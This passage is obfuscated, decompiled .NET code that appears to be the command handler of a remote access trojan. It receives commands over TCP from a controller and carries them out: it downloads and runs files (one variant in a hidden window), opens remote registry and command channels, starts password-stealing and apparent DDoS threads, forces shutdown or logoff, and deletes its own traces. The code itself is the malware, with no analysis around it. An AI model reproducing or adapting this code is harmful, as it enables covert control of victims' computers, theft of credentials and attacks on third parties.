							u4lkk8tJ138.Connect(string_4, yYxuvHumdHoJcejw178);
							Gsbojf82139 = u4lkk8tJ138.GetStream();
							DIgfMur9141 = new StreamReader(Gsbojf82139);
							vlD8jjbL140 = new StreamWriter(Gsbojf82139);
							qoNVJd03142 = new Thread(zDOyXRBYD5w5207);
							qoNVJd03142.Start();
							vlD8jjbL140.WriteLine("/TRYSERVV/");
							vlD8jjbL140.Flush();
							continue;
						case "/TRYTRYOW/":
							aG4opDl5143 = new TcpClient();
							aG4opDl5143.Connect(string_4, yYxuvHumdHoJcejw178);
							bz0aNhOa144 = aG4opDl5143.GetStream();
							streamReader_4 = new StreamReader(bz0aNhOa144);
							SAGCSeXb145 = new StreamWriter(bz0aNhOa144);
							lzYCfNl0147 = new Thread(method_19);
							lzYCfNl0147.Start();
							SAGCSeXb145.WriteLine("/TRYOWWWW/");
							SAGCSeXb145.Flush();
							continue;
						case "/TRYTRYRG/":
							ma3dtgm8148 = new TcpClient();
							ma3dtgm8148.Connect(string_4, yYxuvHumdHoJcejw178);
							zC39wnbV149 = ma3dtgm8148.GetStream();
							fJOejcV5151 = new StreamReader(zC39wnbV149);
							JSnoFpDY150 = new StreamWriter(zC39wnbV149);
							fGfHaKIK152 = new Thread(tkMxnP3wXKMr209);
							fGfHaKIK152.Start();
							JSnoFpDY150.WriteLine("/TRYREGGG/");
							JSnoFpDY150.Flush();
							continue;
						case "/TRYTRYCM/":
							FPlPaaKX153 = new TcpClient();
							FPlPaaKX153.Connect(string_4, yYxuvHumdHoJcejw178);
							n2SnpXkX154 = FPlPaaKX153.GetStream();
							HXTQ8tLZ156 = new StreamReader(n2SnpXkX154);
							x4XKr7Pn155 = new StreamWriter(n2SnpXkX154);
							thread_5 = new Thread(JEAlnjCoVsNG210);
							thread_5.Start();
							x4XKr7Pn155.WriteLine("/TRYCMDDD/");
							x4XKr7Pn155.Flush();
							continue;
						case "/REMOVESV/":
							try
							{
								string text9 = Conversions.ToString(((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_Registry().get_CurrentUser().OpenSubKey(method_2(ZkcYnD2a16.Sdl7qPCA41(), "12345#$%"), writable: false)!.GetValue(method_2(ZkcYnD2a16.LJqBXfvl42(), "12345#$%")));
								((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_FileSystem().DeleteFile(text9);
							}
							catch (Exception projectError27)
							{
								ProjectData.SetProjectError(projectError27);
								ProjectData.ClearProjectError();
							}
							try
							{
								((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_Registry().get_CurrentUser().OpenSubKey(method_2(ZkcYnD2a16.Sdl7qPCA41(), "12345#$%"), writable: true)!.DeleteValue(method_2(ZkcYnD2a16.LJqBXfvl42(), "12345#$%"));
							}
							catch (Exception projectError28)
							{
								ProjectData.SetProjectError(projectError28);
								ProjectData.ClearProjectError();
							}
							try
							{
								string text10 = Conversions.ToString(((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_Registry().get_CurrentUser().OpenSubKey(method_2(ZkcYnD2a16.Sdl7qPCA41(), "12345#$%"), writable: false)!.GetValue(method_2(ZkcYnD2a16.oZQXt5ff43(), "12345#$%")));
								((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_FileSystem().DeleteFile(text10);
							}
							catch (Exception projectError29)
							{
								ProjectData.SetProjectError(projectError29);
								ProjectData.ClearProjectError();
							}
							try
							{
								((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_Registry().get_CurrentUser().OpenSubKey(method_2(ZkcYnD2a16.Sdl7qPCA41(), "12345#$%"), writable: true)!.DeleteValue(method_2(ZkcYnD2a16.oZQXt5ff43(), "12345#$%"));
							}
							catch (Exception projectError30)
							{
								ProjectData.SetProjectError(projectError30);
								ProjectData.ClearProjectError();
							}
							try
							{
								string executablePath = Application.get_ExecutablePath();
								string text11 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft";
								_ = text11 + "\\" + Path.GetFileName(executablePath);
								foreach (string file in ((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_FileSystem().GetFiles(text11))
								{
									try
									{
										if (((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_FileSystem().GetFileInfo(file).Length > 100000L)
										{
											((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_FileSystem().DeleteFile(file);
										}
									}
									catch (Exception projectError31)
									{
										ProjectData.SetProjectError(projectError31);
										ProjectData.ClearProjectError();
									}
								}
							}
							catch (Exception projectError32)
							{
								ProjectData.SetProjectError(projectError32);
								ProjectData.ClearProjectError();
							}
							try
							{
								Environment.Exit(0);
							}
							catch (Exception projectError33)
							{
								ProjectData.SetProjectError(projectError33);
								Environment.Exit(0);
								ProjectData.ClearProjectError();
							}
							continue;
						case "/DLARUNVS/":
							try
							{
								List<string> list2 = new List<string>();
								string[] array6 = Strings.Mid(text4, 11, Strings.Len(text4)).Split(new char[1] { '/' });
								string[] array7 = array6;
								foreach (string item2 in array7)
								{
									list2.Add(item2);
								}
								int index2 = list2.Count - 1;
								string text7 = Strings.Mid(text4, 11, Strings.Len(text4));
								string[] array8 = list2[index2].ToString().Split(new char[1] { '.' });
								string text8 = null;
								text8 = ((!((Operators.CompareString(array8[array8.Length - 1], "swf", false) == 0) | (Operators.CompareString(array8[array8.Length - 1], "SWF", false) == 0))) ? array8[array8.Length - 1] : "exe");
								((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_Network().DownloadFile(text7, Environment.GetEnvironmentVariable("Temp") + "\\" + array8[0] + "." + text8, (string)null, (string)null, false, 100000, true);
								ssqwzwagQoOhjET2PiWIbjP3122(1);
								Process.Start(Environment.GetEnvironmentVariable("Temp") + "\\" + array8[0] + "." + text8);
							}
							catch (Exception projectError26)
							{
								ProjectData.SetProjectError(projectError26);
								ProjectData.ClearProjectError();
							}
							continue;
						case "/DLARUNHD/":
							try
							{
								List<string> list = new List<string>();
								string[] array3 = Strings.Mid(text4, 11, Strings.Len(text4)).Split(new char[1] { '/' });
								string[] array4 = array3;
								foreach (string item in array4)
								{
									list.Add(item);
								}
								int index = list.Count - 1;
								string text5 = Strings.Mid(text4, 11, Strings.Len(text4));
								string[] array5 = list[index].ToString().Split(new char[1] { '.' });
								string text6 = null;
								text6 = ((!((Operators.CompareString(array5[array5.Length - 1], "swf", false) == 0) | (Operators.CompareString(array5[array5.Length - 1], "SWF", false) == 0))) ? array5[array5.Length - 1] : "exe");
								((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_Network().DownloadFile(text5, Environment.GetEnvironmentVariable("Temp") + "\\" + array5[0] + "." + text6, (string)null, (string)null, false, 100000, true);
								ssqwzwagQoOhjET2PiWIbjP3122(1);
								Process process = new Process();
								process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
								process.StartInfo.FileName = Environment.GetEnvironmentVariable("Temp") + "\\" + array5[0] + "." + text6;
								process.Start();
							}
							catch (Exception projectError25)
							{
								ProjectData.SetProjectError(projectError25);
								ProjectData.ClearProjectError();
							}
							continue;
						case "/RESTWIND/":
							try
							{
								Interaction.Shell("shutdown -r /t 0", (AppWinStyle)2, false, -1);
							}
							catch (Exception projectError24)
							{
								ProjectData.SetProjectError(projectError24);
								ProjectData.ClearProjectError();
							}
							continue;
						case "/TURNWIND/":
							try
							{
								Interaction.Shell("shutdown -s /t 0", (AppWinStyle)2, false, -1);
							}
							catch (Exception projectError23)
							{
								ProjectData.SetProjectError(projectError23);
								ProjectData.ClearProjectError();
							}
							continue;
						case "/LOGOWIND/":
							try
							{
								Interaction.Shell("shutdown -l /t 0", (AppWinStyle)2, false, -1);
							}
							catch (Exception projectError22)
							{
								ProjectData.SetProjectError(projectError22);
								ProjectData.ClearProjectError();
							}
							continue;
						case "/MEUPDATE/":
							continue;
						case "/BACKUPUP/":
							continue;
						case "/INSTALLK/":
							try
							{
								text4 = Strings.Mid(text4, 11, Strings.Len(text4));
								Thread thread7 = new Thread(method_13);
								thread7.Start(text4);
							}
							catch (Exception projectError21)
							{
								ProjectData.SetProjectError(projectError21);
								ProjectData.ClearProjectError();
							}
							continue;
						case "/UPANDRUN/":
							try
							{
								text4 = Strings.Mid(text4, 11, Strings.Len(text4));
								Thread thread6 = new Thread(GuzUMFeqi4ff160);
								thread6.Start(text4);
							}
							catch (Exception projectError20)
							{
								ProjectData.SetProjectError(projectError20);
								ProjectData.ClearProjectError();
							}
							continue;
						case "/DDATONWB/":
							try
							{
								text4 = Strings.Mid(text4, 11, Strings.Len(text4));
								Thread thread5 = new Thread(method_9);
								thread5.Start(text4);
							}
							catch (Exception projectError19)
							{
								ProjectData.SetProjectError(projectError19);
								ProjectData.ClearProjectError();
							}
							continue;
						case "/PASSALLL/":
							try
							{
								Thread thread4 = new Thread(NcigevL2rxJT156);
								thread4.Start();
							}
							catch (Exception projectError18)
							{
								ProjectData.SetProjectError(projectError18);
								ProjectData.ClearProjectError();
							}
							continue;
						case "/OPENWEBB/":
							try
							{
								text4 = Strings.Mid(text4, 11, Strings.Len(text4));
								Thread thread3 = new Thread(euAHczyWtnTd157);
								thread3.Start(text4);
							}
							catch (Exception projectError17)
							{
								ProjectData.SetProjectError(projectError17);
								ProjectData.ClearProjectError();
							}
							continue;
						case "/DDATONWS/":
							try
							{
								Thread thread2 = new Thread(method_10);
								thread2.Start();
							}
							catch (Exception projectError16)
							{
								ProjectData.SetProjectError(projectError16);
								ProjectData.ClearProjectError();
							}
							continue;
						case "/AVAILABL/":
							try
							{
								text4 = Strings.Mid(text4, 11, Strings.Len(text4));
								Thread thread = new Thread(mMeX26At15Lj159);
								thread.Start(text4);
							}
							catch (Exception projectError15)
							{
								ProjectData.SetProjectError(projectError15);
								ProjectData.ClearProjectError();
							}
							continue;
						case "/RETURNSX/":
							try
							{
								text4 = Strings.Mid(text4, 11, Strings.Len(text4));
								try
								{
									try
									{
										if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_Registry().get_CurrentUser().OpenSubKey("Software\\Microsoft", writable: false)!.GetValue("Client"), (object)text4, false))))
										{
											((ServerComputer)N16OftqaR9kA1ge5r9p5B2.Computer).get_Registry().get_CurrentUser().OpenSubKey("Software\\Microsoft", writable: true)!.SetValue("Client", text4, RegistryValueKind.String);
										}
									}
									catch (Exception projectError12)
									{
										ProjectData.SetProjectError(projectError12);
										ProjectData.ClearProjectError();
									}
								}
								catch (Exception projectError13)
								{
									ProjectData.SetProjectError(projectError13);
									ProjectData.ClearProjectError();
								}
							}
							catch (Exception projectError14)
							{
								ProjectData.SetProjectError(projectError14);
								ProjectData.ClearProjectError();
							}
							continue;
						}
						ssqwzwagQoOhjET2PiWIbjP3122(5);
						ZFKvgVNVtmCx15++;
						if (ZFKvgVNVtmCx15 <= 5)
						{
							continue;
						}
						try
						{
							H7Dh6pvsTw1D30.WriteLine("test");
							H7Dh6pvsTw1D30.Flush();
						}
						catch (Exception projectError34)
						{
							ProjectData.SetProjectError(projectError34);
							try
							{
								if (!tcpClient_0.Connected)
								{
									ProjectData.ClearProjectError();
									break;
								}
							}
							catch (Exception projectError35)
							{
								ProjectData.SetProjectError(projectError35);
								ProjectData.ClearProjectError();
							}
							ProjectData.ClearProjectError();
						}
					}
					catch (Exception projectError36)
					{
						ProjectData.SetProjectError(projectError36);
						ProjectData.ClearProjectError();
					}
				}
				try
				{
					qrkOw7laVvfcWcEpom74OXj5130();
					Thread.Sleep(100);
				}
				catch (Exception projectError37)
				{
					ProjectData.SetProjectError(projectError37);
					Thread.Sleep(100);
					ProjectData.ClearProjectError();
				}
			}
		}
	}
}
